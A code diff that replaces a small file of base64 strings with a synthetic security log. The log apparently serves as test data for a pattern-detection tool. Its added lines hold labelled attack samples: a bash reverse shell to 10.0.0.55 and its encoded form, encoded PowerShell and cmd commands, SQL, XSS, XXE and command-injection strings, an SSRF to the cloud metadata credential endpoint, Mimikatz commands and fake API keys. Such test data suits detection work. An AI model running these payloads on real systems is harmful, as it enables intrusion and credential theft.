@@ -1,10 +1,54 @@
-Normal text content here
-Found encoded string: dGhpcyBpcyBhIHRlc3QgbWVzc2FnZQ==
-Another line of normal content
-Potential payload: cG93ZXJzaGVsbCAtZSBieXBhc3M=
-Regular application data
-Base64 pattern: YWRtaW46cGFzc3dvcmQxMjM=
-System configuration line
-Encoded data: ZXZpbCBzY3JpcHQgY29udGVudA==
-More normal text
-Hidden string: c2VjcmV0IGluZm9ybWF0aW9u
+2024-01-15 10:00:00 Normal HTTP traffic observed from 192.168.1.105
+2024-01-15 10:05:23 Found encoded string: dGhpcyBpcyBhIHRlc3QgbWVzc2FnZQ==
+2024-01-15 10:10:45 Another line of normal content with no issues
+2024-01-15 10:15:12 Potential payload detected: cG93ZXJzaGVsbCAtZSBieXBhc3M=
+2024-01-15 10:20:33 Regular application data transfer completed successfully
+2024-01-15 10:25:44 Base64 credential pattern: YWRtaW46cGFzc3dvcmQxMjM=
+2024-01-15 10:30:55 System configuration reloaded from file
+2024-01-15 10:35:11 Encoded malicious script: ZXZpbCBzY3JpcHQgY29udGVudA==
+2024-01-15 10:40:22 More normal text and legitimate traffic
+2024-01-15 10:45:33 Hidden API key found: c2VjcmV0IGluZm9ybWF0aW9u
+2024-01-15 10:50:44 Email addresses found: john.doe@example.com, alice@company.org, bob_smith@test.co.uk
+2024-01-15 10:55:55 Phone numbers detected: +1-555-0123, (555) 456-7890, 555.234.5678
+2024-01-15 11:00:11 Credit card pattern: 4532-1234-5678-9010 (masked for security)
+2024-01-15 11:05:22 IPv4 addresses: 10.0.0.1, 172.16.254.1, 192.168.100.50, 203.0.113.99
+2024-01-15 11:10:33 IPv6 addresses: 2001:0db8:85a3:0000:0000:8a2e:0370:7334, fe80::1
+2024-01-15 11:15:44 URL patterns: https://evil.com/backdoor.php, http://malware.net/payload.exe
+2024-01-15 11:20:55 JWT token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abc123
+2024-01-15 11:25:11 MAC addresses: 00:1B:44:11:3A:B7, AA:BB:CC:DD:EE:FF, 08-00-27-12-34-56
+2024-01-15 11:30:22 Suspicious DNS queries: evil-c2-server.com, malware-download.net, phishing-site.org
+2024-01-15 11:35:33 Encoded command: Y21kLmV4ZSAvYyB3aG9hbWkgJiYgaXBjb25maWc=
+2024-01-15 11:40:44 API keys detected: sk_live_51HvN2RKzo3kP7a1B2c, AKIA1234567890EXAMPLE
+2024-01-15 11:45:55 MD5 hashes: 5d41402abc4b2a76b9719d911017c592, 098f6bcd4621d373cade4e832627b4f6
+2024-01-15 11:50:11 SHA256 hashes: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+2024-01-15 11:55:22 SSN patterns: 123-45-6789, 987-65-4321 (should be redacted!)
+2024-01-15 12:00:33 File paths: C:\\Windows\\System32\\cmd.exe, /etc/passwd, /var/www/html/config.php
+2024-01-15 12:05:44 Encoded PowerShell: cG93ZXJzaGVsbCAtTm9QIC1Ob25JIC1XIEhpZGRlbiAtRXhlYyBCeXBhc3M=
+2024-01-15 12:10:55 Bitcoin addresses: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa, bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
+2024-01-15 12:15:11 Docker commands: docker exec -it container_id /bin/bash
+2024-01-15 12:20:22 SQL injection attempt: ' OR 1=1--', admin'--', UNION SELECT NULL--
+2024-01-15 12:25:33 XSS payloads: <script>alert('xss')</script>, <img src=x onerror=alert(1)>
+2024-01-15 12:30:44 LDAP injection: *)(&, )(|, *)(uid=*))(|(uid=*
+2024-01-15 12:35:55 Command injection: ; ls -la, | cat /etc/passwd, && whoami
+2024-01-15 12:40:11 Path traversal: ../../../../etc/shadow, ..\\..\\windows\\system.ini
+2024-01-15 12:45:22 XXE payload: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+2024-01-15 12:50:33 Reverse shell: bash -i >& /dev/tcp/10.0.0.55/4444 0>&1
+2024-01-15 12:55:44 Encoded reverse shell: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuNTUvNDQ0NCAwPiYx
+2024-01-15 13:00:55 Mimikatz commands: sekurlsa::logonpasswords, lsadump::sam
+2024-01-15 13:05:11 Registry keys: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+2024-01-15 13:10:22 Cron expressions: 0 */5 * * * /tmp/backdoor.sh
+2024-01-15 13:15:33 AWS secret: aws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+2024-01-15 13:20:44 Private SSH key header: -----BEGIN RSA PRIVATE KEY-----
+2024-01-15 13:25:55 GCP service account: service-account@project-id.iam.gserviceaccount.com
+2024-01-15 13:30:11 Azure connection string: DefaultEndpointsProtocol=https;AccountName=storage
+2024-01-15 13:35:22 Slack webhook: https://hooks.slack.com/services/T00000000/B00000000/XXXXXXXXXXXX
+2024-01-15 13:40:33 GitHub token: ghp_1234567890abcdefghijklmnopqrstuvwxyz
+2024-01-15 13:45:44 Encoded exfiltration: ZGF0YT1zZW5zaXRpdmVfaW5mb3JtYXRpb24mZGVzdD0xMC4wLjAuNTU=
+2024-01-15 13:50:55 Suspicious user agents: sqlmap/1.4.7, nikto/2.1.6, nmap scripting engine
+2024-01-15 13:55:11 Polyglot payload: jaVasCript:/*--></title></style></textarea></script></xmp>
+2024-01-15 14:00:22 IDOR attempt: /api/user/1, /api/user/2, /api/user/3 (sequential scanning)
+2024-01-15 14:05:33 GraphQL introspection: {__schema{types{name,fields{name}}}}
+2024-01-15 14:10:44 SSRF attempt: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+2024-01-15 14:15:55 NoSQL injection: {"$gt":""}, {"$ne":null}, {"$where":"1==1"}
+2024-01-15 14:20:11 Template injection: {{7*7}}, ${7*7}, <%= 7*7 %>, ${{7*7}}
+2024-01-15 14:25:22 Deserialization payload: rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==
